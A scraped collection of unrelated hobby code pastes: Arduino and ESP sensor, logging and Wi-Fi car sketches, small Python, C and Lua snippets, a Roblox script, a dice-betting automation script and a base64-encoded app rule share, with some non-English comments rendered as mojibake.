#include <LiquidCrystal_I2C.h>  // https://github.com/marcoschwartz/LiquidCrystal_I2C
#include <DHT.h>  // https://github.com/adafruit/DHT-sensor-library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t DHT22_DOUT_PIN_D5 = 5;

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t led1_LEDRGB_Green_PIN_D3 = 3;

/***** DEFINITION OF I2C PINS *****/
const uint8_t lcd_LCD1602I2C_I2C_PIN_SDA_A4 = A4;
const uint8_t lcd_LCD1602I2C_I2C_PIN_SCL_A5 = A5;
const uint8_t lcd_LCD1602I2C_I2C_SLAVE_ADDRESS = 0x27;  // Corrected to 0x27 based on examples

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
bool led1_LEDRGB_Green_PIN_D3_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float led1_LEDRGB_Green_PIN_D3_phyData = 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES *****/
LiquidCrystal_I2C lcd(lcd_LCD1602I2C_I2C_SLAVE_ADDRESS, 16, 2);  // Initialize with address, columns, and rows

#define DHTTYPE DHT22   // Define the type of DHT sensor
DHT dht(DHT22_DOUT_PIN_D5, DHTTYPE);  // Initialize DHT sensor

void setup(void)
{
  // put your setup code here, to run once:
  pinMode(DHT22_DOUT_PIN_D5, INPUT_PULLUP);
  pinMode(led1_LEDRGB_Green_PIN_D3, OUTPUT);

  // Initialize the LCD
  lcd.init();
  lcd.backlight();
  lcd.setCursor(0, 0);
  lcd.print(""Initializing..."");

  // Initialize the DHT sensor
  dht.begin();
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  updateOutputs(); // Refresh output data

  // Read humidity and temperature from DHT sensor
  float h = dht.readHumidity();
  float t = dht.readTemperature();

  // Check if any reads failed and exit early (to try again).
  if (isnan(h) || isnan(t)) {
    lcd.setCursor(0, 0);
    lcd.print(F(""Failed to read""));
    lcd.setCursor(0, 1);
    lcd.print(F(""from DHT sensor""));
    return;
  }

  // Update LED status based on temperature
  if (t < 25.0) {
    led1_LEDRGB_Green_PIN_D3_rawData = HIGH;  // Turn on LED
  } else {
    led1_LEDRGB_Green_PIN_D3_rawData = LOW;   // Turn off LED
  }

  // Print the results to the LCD
  lcd.setCursor(0, 0);
  lcd.print(F(""Humidity: ""));
  lcd.print(h);
  lcd.print(F(""%   ""));  // Clear any leftover characters

  lcd.setCursor(0, 1);
  lcd.print(F(""Temp: ""));
  lcd.print(t);
  lcd.print(F(""C   ""));  // Clear any leftover characters

  delay(2000);  // Wait a few seconds between measurements.
}

void updateOutputs()
{
  digitalWrite(led1_LEDRGB_Green_PIN_D3, led1_LEDRGB_Green_PIN_D3_rawData);
}

/* END CODE */"
YNyKMQw7,Untitled,dllbridge,C,Sunday 30th of June 2024 02:37:35 AM CDT,"
#include  <stdio.h>

 

/////////////////////////////////
int main()                     //
{
     
    int n1 = 2;
    int n2 = 4; 
    
    
    scanf(""%d"", &n1);
    
    if(n1 > 77)  goto L_01;
     
      printf(""SONY %d "", n1);
    
L_01: printf(""Pictures\n""); 
  
}




"
CiRhtE3Q,punkt_kolicji,jarekmor,Python,Sunday 30th of June 2024 02:36:20 AM CDT,"import sympy as sp
import numpy as np

# Definicja danych wej≈õciowych
r1 = 1.0   # ≈õrednica pi≈Çki 1
m1 = 1.0   # masa pi≈Çki 1
x1, y1, z1 = 0.0, 0.0, 0.0  # poczƒÖtkowe po≈Ço≈ºenie pi≈Çki 1
vx1, vy1, vz1 = 1.0, 1.0, 1.0  # prƒôdko≈õƒá pi≈Çki 1

r2 = 1.0   # ≈õrednica pi≈Çki 2
m2 = 1.0   # masa pi≈Çki 2
x2, y2, z2 = 1.0, 1.0, 1.0  # poczƒÖtkowe po≈Ço≈ºenie pi≈Çki 2
vx2, vy2, vz2 = -1.0, -1.0, -1.0  # prƒôdko≈õƒá pi≈Çki 2

# Promienie pi≈Çek
R1 = r1 / 2
R2 = r2 / 2

# Promie≈Ñ sumaryczny do sprawdzenia kolizji
R = R1 + R2

# Zmienne czasowe
t = sp.symbols('t')

# Po≈Ço≈ºenie pi≈Çek w funkcji czasu
x1t = x1 + vx1 * t
y1t = y1 + vy1 * t
z1t = z1 + vz1 * t

x2t = x2 + vx2 * t
y2t = y2 + vy2 * t
z2t = z2 + vz2 * t

# Odleg≈Ço≈õƒá miƒôdzy pi≈Çkami w funkcji czasu
distance = sp.sqrt((x2t - x1t)**2 + (y2t - y1t)**2 + (z2t - z1t)**2)

# R√≥wnanie kolizji
collision_eq = sp.Eq(distance, R)

# RozwiƒÖzanie r√≥wnania kolizji
collision_time = sp.solve(collision_eq, t)
collision_time = [t for t in collision_time if t >= 0]

# Sprawdzenie, czy nastƒÖpi kolizja
if collision_time:
    t_collision = collision_time[0]
    
    # Punkt zderzenia
    x_collision = x1 + vx1 * t_collision
    y_collision = y1 + vy1 * t_collision
    z_collision = z1 + vz1 * t_collision
    
    collision_point = (x_collision.evalf(), y_collision.evalf(), z_collision.evalf())
else:
    collision_point = None

if collision_point:
    # Przeliczenie po≈Ço≈ºenia w momencie kolizji
    x1_collision = x1 + vx1 * t_collision
    y1_collision = y1 + vy1 * t_collision
    z1_collision = z1 + vz1 * t_collision

    x2_collision = x2 + vx2 * t_collision
    y2_collision = y2 + vy2 * t_collision
    z2_collision = z2 + vz2 * t_collision

    # Wektor normalny w momencie zderzenia
    n = np.array([x2_collision - x1_collision, y2_collision - y1_collision, z2_collision - z1_collision]).astype(float)
    n = n / np.linalg.norm(n)

    # Wektory prƒôdko≈õci
    v1 = np.array([vx1, vy1, vz1])
    v2 = np.array([vx2, vy2, vz2])

    # Prƒôdko≈õci po zderzeniu
    v1_prime = v1 - (2 * m2 / (m1 + m2)) * np.dot(v1 - v2, n) * n
    v2_prime = v2 - (2 * m1 / (m1 + m2)) * np.dot(v2 - v1, n) * n

    new_velocities = (v1_prime, v2_prime)
else:
    new_velocities = None

print(""Punkt kolizji:"", collision_point)
print(""=""*20)
print(""Nowa prƒôdko≈õƒá po zderzeniu:"", new_velocities) 

--------------------------------------------------------------
Punkt kolizji: (0.211324865405187, 0.211324865405187, 0.211324865405187)
====================
Nowa prƒôdko≈õƒá po zderzeniu: (array([-1., -1., -1.]), array([1., 1., 1.]))"
22ubLpGD,Singulary,nauseant,Lua,Sunday 30th of June 2024 02:35:44 AM CDT,"-- Function to take item from the left and store it in the turtle's inventory
function takeItemFromLeft()
    turtle.turnLeft()
    turtle.suck(1)
    turtle.turnRight()
end

-- Function to take item from the right and store it in the turtle's inventory
function takeItemFromRight()
    turtle.turnRight()
    turtle.suck(1)
    turtle.turnLeft()
end

-- Function to drop items in front of the turtle
function dropItemsFront()
    for i = 1, 16 do
        turtle.select(i)
        turtle.drop()
    end
end

-- Function to drop items upwards
function dropItemsUp()
    for i = 1, 16 do
        turtle.select(i)
        turtle.dropUp()
    end
end

-- Function to suck items from in front of the turtle
function suckItems()
    turtle.suck()
end

-- Main routine
function main()
    takeItemFromLeft()
    takeItemFromRight()
    dropItemsFront()
    os.sleep(5)
    suckItems()
    dropItemsUp()
end

-- Run the main routine
main()
"
rpJvYyZv,Algoverse_adesh_31,kucheasysa,Python,Sunday 30th of June 2024 02:33:33 AM CDT,"class Solution:
    def searchKey(self, n, head, key):
        #Code here
         
        while head:
            if head.data == key:
                return True
                
            head = head.next
        
        return False
        #Code here
"
tMbKFRRC,"""SPI Initialization"" rev_02",pleasedontcode,Arduino,Sunday 30th of June 2024 02:09:47 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""SPI Initialization""
	- Source Code compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-06-30 07:05:22

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* i need a function for log and notfication. i need */
	/* a function wjich i call this form : log.debug(); */
	/* we have some input argument , ""message"" as */
	/* string,and select one output port serial port,sd */
	/* card,web serial ,WebService . */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <SPI.h>
#include <SdFat.h>  //https://github.com/greiman/SdFat

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void logDebug(const char* message, int outputPort);

/***** DEFINITION OF SPI PINS *****/
const uint8_t SD_SDCardModule_SPI_PIN_MOSI_D23 = 23;
const uint8_t SD_SDCardModule_SPI_PIN_MISO_D19 = 19;
const uint8_t SD_SDCardModule_SPI_PIN_SCLK_D18 = 18;
const uint8_t SD_SDCardModule_SPI_PIN_CS_D5 = 5;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
SdFat sd;
SdFile binFile;

/****** OUTPUT PORT DEFINITIONS *****/
enum OutputPort {
    SERIAL_PORT,
    SD_CARD,
    WEB_SERIAL,
    WEB_SERVICE
};

void setup(void)
{
    // put your setup code here, to run once:
    Serial.begin(9600);
    pinMode(SD_SDCardModule_SPI_PIN_CS_D5, OUTPUT);
    digitalWrite(SD_SDCardModule_SPI_PIN_CS_D5, HIGH);

    // start the SPI library:
    SPI.begin(SD_SDCardModule_SPI_PIN_SCLK_D18, SD_SDCardModule_SPI_PIN_MISO_D19, SD_SDCardModule_SPI_PIN_MOSI_D23, SD_SDCardModule_SPI_PIN_CS_D5);

    // Initialize the SD card
    if (!sd.begin(SD_SDCardModule_SPI_PIN_CS_D5, SD_SCK_MHZ(50))) {
        sd.initErrorPrint(&Serial);
        while (true) {}
    }
}

void loop(void)
{
    // put your main code here, to run repeatedly:
    // Example: Print a message to the serial monitor
    logDebug(""SD card initialized successfully!"", SERIAL_PORT);
    delay(1000); // Wait for 1 second
}

/****** LOGGING FUNCTION *****/
void logDebug(const char* message, int outputPort) {
    switch (outputPort) {
        case SERIAL_PORT:
            Serial.println(message);
            break;
        case SD_CARD:
            if (binFile.open(""log.txt"", O_RDWR | O_CREAT | O_AT_END)) {
                binFile.print(message);  // Use print instead of println
                binFile.print(""\n"");     // Add newline character manually
                binFile.close();
            } else {
                Serial.println(""Failed to open log file on SD card."");
            }
            break;
        case WEB_SERIAL:
            // Implement web serial logging
            break;
        case WEB_SERVICE:
            // Implement web service logging
            break;
        default:
            Serial.println(""Invalid output port."");
            break;
    }
}

/* END CODE */"
ArTMDpv4,"""SPI Logging"" rev_01",pleasedontcode,Arduino,Sunday 30th of June 2024 02:04:05 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""SPI Logging""
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-06-30 07:02:21

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* i need a function for log and notfication. i need */
	/* a function wjich i call this form : log.debug(); */
	/* we have some input argument , ""message"" as */
	/* string,and select one output port serial port,sd */
	/* card,web serial ,WebService . */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <SPI.h>
#include <SdFat.h>  //https://github.com/greiman/SdFat

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void logDebug(const char* message, int outputPort);

/***** DEFINITION OF SPI PINS *****/
const uint8_t SD_SDCardModule_SPI_PIN_MOSI_D23 = 23;
const uint8_t SD_SDCardModule_SPI_PIN_MISO_D19 = 19;
const uint8_t SD_SDCardModule_SPI_PIN_SCLK_D18 = 18;
const uint8_t SD_SDCardModule_SPI_PIN_CS_D5 = 5;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
SdFat sd;
SdBaseFile binFile;

/****** OUTPUT PORT DEFINITIONS *****/
enum OutputPort {
    SERIAL_PORT,
    SD_CARD,
    WEB_SERIAL,
    WEB_SERVICE
};

void setup(void)
{
    // put your setup code here, to run once:
    Serial.begin(9600);
    pinMode(SD_SDCardModule_SPI_PIN_CS_D5, OUTPUT);
    digitalWrite(SD_SDCardModule_SPI_PIN_CS_D5, HIGH);

    // start the SPI library:
    SPI.begin(SD_SDCardModule_SPI_PIN_SCLK_D18, SD_SDCardModule_SPI_PIN_MISO_D19, SD_SDCardModule_SPI_PIN_MOSI_D23, SD_SDCardModule_SPI_PIN_CS_D5);

    // Initialize the SD card
    if (!sd.begin(SD_SDCardModule_SPI_PIN_CS_D5, SD_SCK_MHZ(50))) {
        sd.initErrorPrint(&Serial);
        while (true) {}
    }
}

void loop(void)
{
    // put your main code here, to run repeatedly:
    // Example: Print a message to the serial monitor
    logDebug(""SD card initialized successfully!"", SERIAL_PORT);
    delay(1000); // Wait for 1 second
}

/****** LOGGING FUNCTION *****/
void logDebug(const char* message, int outputPort) {
    switch (outputPort) {
        case SERIAL_PORT:
            Serial.println(message);
            break;
        case SD_CARD:
            if (binFile.open(""log.txt"", O_RDWR | O_CREAT | O_AT_END)) {
                binFile.println(message);
                binFile.close();
            } else {
                Serial.println(""Failed to open log file on SD card."");
            }
            break;
        case WEB_SERIAL:
            // Implement web serial logging
            break;
        case WEB_SERVICE:
            // Implement web service logging
            break;
        default:
            Serial.println(""Invalid output port."");
            break;
    }
}

/* END CODE */"
dR27G6Jt,world map camera zones,Enjl,Lua,Sunday 30th of June 2024 12:54:03 AM CDT,"-- How to set up world map camera zones
-- This goes into your map.lua file, in the same folder as your .wld file.
-- First, load camlock
local camlock = require(""camlock"")

-- The function camlock.addZone creates a camera zone at the given x and y coordinate, with a given width and height.
-- The vanilla map boundary is 68 pixels left, right and down, and 130 pixels up. If you know the top left corner of your visible space, you will have to subtract 68 pixels on the x-axis and 130 pixels on the y-axis to find the true camera position.
camlock.addZone(0, 0, 800, 600) -- This creates a single-screen camera zone with the camera in the top left corner at 0,0. If the world map border is active, this means the top left visible tile is at coordinate 68, 130. If the world map border is active, the visible area of one screen is 670x402 pixels.

-- Copy the addZoneHelper function into your map.lua to make it easier to create camera zones with the world map border active. You give it the coordinate of the top left visible pixel, and the number of screens you want in terms of width and height.
local function addZoneHelper(x, y, screensX, screensY)
	camlock.addZone(x - 68, y - 130, 130 + screensX * 670, 198 + screensY * 402)
end
-- Creates a 2-screen-wide camera zone with the top left corner being at coordinate x=64, y=128.
addZoneHelper(64, 128, 2, 1)
-- Creates a 3-screen-wide and 4.5 screen tall camera zone with the top left corner being at coordinate x=1120, y=-60.
addZoneHelper(1120, -60, 3, 4.5)"
uWm3vF3q,sugihrawaras,dicekode,Lua,Sunday 30th of June 2024 12:09:03 AM CDT,"io.write('++ input basebet ')
local basebet = io.read(""*n"")

io.write('++ input chance ')
local chancef = io.read(""*n"")

io.write('++ input multiplier ')
local multi = io.read(""*n"")

io.write('++ input prebet ')
local prebet = io.read(""*n"")

io.write('++ input postbet ')
local postbet = io.read(""*n"")
 
io.write('++ input pause ifprofit % ')
local ifpause = io.read(""*n"")
 
io.write('++ input stop ifprofit % ')
local ifprofit = io.read(""*n"")
 
os.execute(""cls"")

-- basebet  = 0.1
-- multi    = 1.5
-- prebet   = 10
-- postbet  = 20
dopause  = balance*(ifpause/100)
target   = balance+(balance*(ifprofit/100))
chancef  = 9
streakmx = 0
chance   = chancef
nextbet  = basebet
lastch   = chance
profitc  = 0

function shoot()
    if math.random(10)<3 then 
        chance = math.random(10,50)/10  
    end 
end

function betload(a,b)
    return math.abs(a)/((95/b)-1)*1.01
end

function dobet()
    profitc = profitc + currentprofit
    if profitc > 0 then
        if profitc > dopause then 
            pause()
        end
        profitc = 0
    end
    if win then
        if streakmx > prebet+postbet then
            prebet = prebet+(streakmx-(prebet+postbet))
        end
        nextbet = basebet
        chance  = chancef
        lastch  = chance
    else
        streak  = math.abs(currentstreak)
        nextbet = previousbet*multi
        if streak > postbet+prebet then
            chance  = math.max(chance,lastch) 
            chance  = chance+(chance*(2/100))
            nextbet = betload(profitc,chance)
            lastch  = chance
            shoot() 
        end
        if streak < prebet then
            nextbet = basebet
        end
        streakmx = math.max(streakmx,streak)
    end
    nextbet = math.max(nextbet,basebet)
    if balance > target then stop() end
    print(""++ streak :""..prebet.."" post until :""..(prebet+postbet))
end"
DX7nys3n,Drop other item,fornakter,Lua,Saturday 29th of June 2024 11:58:36 PM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local dropEvent = ReplicatedStorage:WaitForChild(""DropEvent"")

dropEvent.OnServerEvent:Connect(function(player)
	local playerModel = game.Workspace:FindFirstChild(player.Name)
	if playerModel then
		local tool = playerModel:FindFirstChildOfClass(""Tool"") -- tool name
		if tool then
			tool.Parent = game.Workspace
			tool.Handle.CFrame = playerModel.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
		end
	end
end)"
buwCN46H,NodeMCU Car with L298N,andretafta,Arduino,Saturday 29th of June 2024 11:37:47 PM CDT,"#define ENA   D1          // Enable/speed motors Right        GPIO14(D1)
#define IN_1  D2          // L298N in1 motors Rightx          GPIO15(D2)
#define IN_2  D3          // L298N in2 motors Right           GPIO13(D3)
#define IN_3  D4           // L298N in3 motors Left            GPIO2(D4)
#define IN_4  D5           // L298N in4 motors Left            GPIO0(D5)
#define ENB   D6          // Enable/speed motors Left         GPIO12(D6)

 
#include <ESP8266WiFi.h>
#include <WiFiClient.h> 
#include <ESP8266WebServer.h>
 
String command;             //String to store app command state.
int speedCar = 800;         // 400 - 1023.
int speed_Coeff = 3;
 
const char* ssid = ""NodeMCU Car"";
ESP8266WebServer server(80);
 
void setup() {
 
 pinMode(ENA, OUTPUT);
 pinMode(ENB, OUTPUT);  
 pinMode(IN_1, OUTPUT);
 pinMode(IN_2, OUTPUT);
 pinMode(IN_3, OUTPUT);
 pinMode(IN_4, OUTPUT); 
  
  Serial.begin(115200);
  
// Connecting WiFi
 
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid);
 
  IPAddress myIP = WiFi.softAPIP();
  Serial.print(""AP IP address: "");
  Serial.println(myIP);
 
 // Starting WEB-server 
     server.on ( ""/"", HTTP_handleRoot );
     server.onNotFound ( HTTP_handleRoot );
     server.begin();    
}
 
void goAhead(){ 
 
      digitalWrite(IN_1, LOW);
      digitalWrite(IN_2, HIGH);
      analogWrite(ENA, speedCar);
 
      digitalWrite(IN_3, LOW);
      digitalWrite(IN_4, HIGH);
      analogWrite(ENB, speedCar);
  }
 
void goBack(){ 
 
      digitalWrite(IN_1, HIGH);
      digitalWrite(IN_2, LOW);
      analogWrite(ENA, speedCar);
 
      digitalWrite(IN_3, HIGH);
      digitalWrite(IN_4, LOW);
      analogWrite(ENB, speedCar);
  }
 
void goRight(){ 
 
      digitalWrite(IN_1, HIGH);
      digitalWrite(IN_2, LOW);
      analogWrite(ENA, speedCar);
 
      digitalWrite(IN_3, LOW);
      digitalWrite(IN_4, HIGH);
      analogWrite(ENB, speedCar);
  }
 
void goLeft(){
 
      digitalWrite(IN_1, LOW);
      digitalWrite(IN_2, HIGH);
      analogWrite(ENA, speedCar);
 
      digitalWrite(IN_3, HIGH);
      digitalWrite(IN_4, LOW);
      analogWrite(ENB, speedCar);
  }
 
void goAheadRight(){
      
      digitalWrite(IN_1, LOW);
      digitalWrite(IN_2, HIGH);
      analogWrite(ENA, speedCar/speed_Coeff);
 
      digitalWrite(IN_3, LOW);
      digitalWrite(IN_4, HIGH);
      analogWrite(ENB, speedCar);
   }
 
void goAheadLeft(){
      
      digitalWrite(IN_1, LOW);
      digitalWrite(IN_2, HIGH);
      analogWrite(ENA, speedCar);
 
      digitalWrite(IN_3, LOW);
      digitalWrite(IN_4, HIGH);
      analogWrite(ENB, speedCar/speed_Coeff);
  }
 
void goBackRight(){ 
 
      digitalWrite(IN_1, HIGH);
      digitalWrite(IN_2, LOW);
      analogWrite(ENA, speedCar/speed_Coeff);
 
      digitalWrite(IN_3, HIGH);
      digitalWrite(IN_4, LOW);
      analogWrite(ENB, speedCar);
  }
 
void goBackLeft(){ 
 
      digitalWrite(IN_1, HIGH);
      digitalWrite(IN_2, LOW);
      analogWrite(ENA, speedCar);
 
      digitalWrite(IN_3, HIGH);
      digitalWrite(IN_4, LOW);
      analogWrite(ENB, speedCar/speed_Coeff);
  }
 
void stopRobot(){  
 
      digitalWrite(IN_1, LOW);
      digitalWrite(IN_2, LOW);
      analogWrite(ENA, speedCar);
 
      digitalWrite(IN_3, LOW);
      digitalWrite(IN_4, LOW);
      analogWrite(ENB, speedCar);
 }
 
void loop() {
    server.handleClient();
    
      command = server.arg(""State"");
      if (command == ""F"") goAhead();
      else if (command == ""B"") goBack();
      else if (command == ""L"") goLeft();
      else if (command == ""R"") goRight();
      else if (command == ""I"") goAheadRight();
      else if (command == ""G"") goAheadLeft();
      else if (command == ""J"") goBackRight();
      else if (command == ""H"") goBackLeft();
      else if (command == ""0"") speedCar = 400;
      else if (command == ""1"") speedCar = 470;
      else if (command == ""2"") speedCar = 540;
      else if (command == ""3"") speedCar = 610;
      else if (command == ""4"") speedCar = 680;
      else if (command == ""5"") speedCar = 750;
      else if (command == ""6"") speedCar = 820;
      else if (command == ""7"") speedCar = 890;
      else if (command == ""8"") speedCar = 960;
      else if (command == ""9"") speedCar = 1023;
      else if (command == ""S"") stopRobot();
}
 
void HTTP_handleRoot(void) {
 
if( server.hasArg(""State"") ){
       Serial.println(server.arg(""State""));
  }
  server.send ( 200, ""text/html"", """" );
  delay(1);
}"
2BAa8izy,ÈÇÄÊÇ®‰∏ÄËµ∑ÁúãÔºö‚≠êÁ¨¨‰∏âÈÉ®ÂàÜ[È°ªÂØºÂÖ•ÂâçÈÉ®ÂàÜÁöÑËÅöÈòÖÂ∞èÁ®ãÂ∫è]‚úàÔ∏è,xiaomianao666,JavaScript,Saturday 29th of June 2024 11:33:32 PM CDT,Êµ∑ÈòîËßÜÁïåËßÑÂàôÂàÜ‰∫´ÔºåÂΩìÂâçÂàÜ‰∫´ÁöÑÊòØÔºö‰∫åÁ∫ßÈ°µÈù¢ËØ¶ÊÉÖÔø•page_detailÔø•‚≠êÁ¨¨‰∏âÈÉ®ÂàÜ[È°ªÂØºÂÖ•ÂâçÈÉ®ÂàÜÁöÑËÅöÈòÖÂ∞èÁ®ãÂ∫è]‚úàÔ∏è@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIlg1XCIsXCJwYXRoXCI6XCJ4NVwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJ1XFxcIikpO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgdXJsOiB1cmwsXFxuICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICBkZXNjOiBcXFwiZmxvYXQmJjEwMCVcXFwiLFxcbiAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIC8vZmxvYXRWaWRlbzogdHJ1ZSxcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxuICAgICAgICBibG9ja1J1bGVzOiBbXFxcIi5naWZcXFwiLCBcXFwiL2FkL1xcXCIsIFxcXCJnb29nbGVcXFwiLCBcXFwiL3NoL3RvL1xcXCIsIFxcXCIuR0lGXFxcIl1cXG4gICAgfVxcbn0pO1xcbnNldFJlc3VsdChkKTtcIn1dLFwicGFyYW1zXCI6XCJ7XFxcImxvbmdDbGlja1xcXCI6W3tcXFwianNcXFwiOlxcXCInZG93bmxvYWQ6Ly9odHRwczovL2docHJveHkubmV0L2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9sczEyNTc4MTAwMy9oaWtlcnJ1bGVzL21haW4vdHh0LzIwMjQtNi0zLnR4dCdcXFwiLFxcXCJ0aXRsZVxcXCI6XFxcIuS4i+i9vVxcXCJ9LHtcXFwianNcXFwiOlxcXCInY29weTovL2h0dHBzOi8vZ2hwcm94eS5uZXQvaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xzMTI1NzgxMDAzL2hpa2VycnVsZXMvbWFpbi90eHQvMjAyNC02LTMudHh0J1xcXCIsXFxcInRpdGxlXFxcIjpcXFwi5aSN5Yi2XFxcIn1dfVwiLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCLotYTmupDmlbTlkIjkuIvovb1iZXRhXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9wYWdlL3g1P3U9YUhSMGNITTZMeTluYUhCeWIzaDVMbTVsZEM5b2RIUndjem92TDNKaGR5NW5hWFJvZFdKMWMyVnlZMjl1ZEdWdWRDNWpiMjB2YkhNeE1qVTNPREV3TURNdmFHbHJaWEp5ZFd4bGN5OXRZV2x1TDNSNGRDOHlNREkwTFRZdE15NTBlSFE9XCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczpcXG52YXIgZCA9IFtdO1xcbmxldCB1cmwgPSBiYXNlNjREZWNvZGUoZ2V0UGFyYW0oXFxcInVcXFwiKSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCJcXFwiLFxcbiAgICB1cmw6IHVybCxcXG4gICAgY29sX3R5cGU6IFxcXCJ4NV93ZWJ2aWV3X3NpbmdsZVxcXCIsXFxuICAgIGRlc2M6IFxcXCJmbG9hdCYmMTAwJVxcXCIsXFxuICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgLy9mbG9hdFZpZGVvOiB0cnVlLFxcbiAgICAgICAgY2FuQmFjazogdHJ1ZSxcXG4gICAgICAgIGJsb2NrUnVsZXM6IFtcXFwiLmdpZlxcXCIsIFxcXCIvYWQvXFxcIiwgXFxcImdvb2dsZVxcXCIsIFxcXCIvc2gvdG8vXFxcIiwgXFxcIi5HSUZcXFwiXVxcbiAgICB9XFxufSk7XFxuc2V0UmVzdWx0KGQpO1wiLFwiZ3JvdXBcIjpcIuWFtuWug1wiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiXCIsXCJwYWdlc1wiOlwiW3tcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIlg1XFxcIixcXFwicGF0aFxcXCI6XFxcIng1XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGQgPSBbXTtcXFxcbmxldCB1cmwgPSBiYXNlNjREZWNvZGUoZ2V0UGFyYW0oXFxcXFxcXCJ1XFxcXFxcXCIpKTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgdXJsOiB1cmwsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwieDVfd2Vidmlld19zaW5nbGVcXFxcXFxcIixcXFxcbiAgICBkZXNjOiBcXFxcXFxcImZsb2F0JiYxMDAlXFxcXFxcXCIsXFxcXG4gICAgcGljX3VybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICAvL2Zsb2F0VmlkZW86IHRydWUsXFxcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxcXG4gICAgICAgIGJsb2NrUnVsZXM6IFtcXFxcXFxcIi5naWZcXFxcXFxcIiwgXFxcXFxcXCIvYWQvXFxcXFxcXCIsIFxcXFxcXFwiZ29vZ2xlXFxcXFxcXCIsIFxcXFxcXFwiL3NoL3RvL1xcXFxcXFwiLCBcXFxcXFxcIi5HSUZcXFxcXFxcIl1cXFxcbiAgICB9XFxcXG59KTtcXFxcbnNldFJlc3VsdChkKTtcXFwifV1cIixcInByb3h5XCI6XCJcIn0iLCJ0aXRsZSI6IuKtkOesrOS4iemDqOWIhlvpobvlr7zlhaXliY3pg6jliIbnmoTogZrpmIXlsI/nqIvluo9d4pyI77iPIn0=
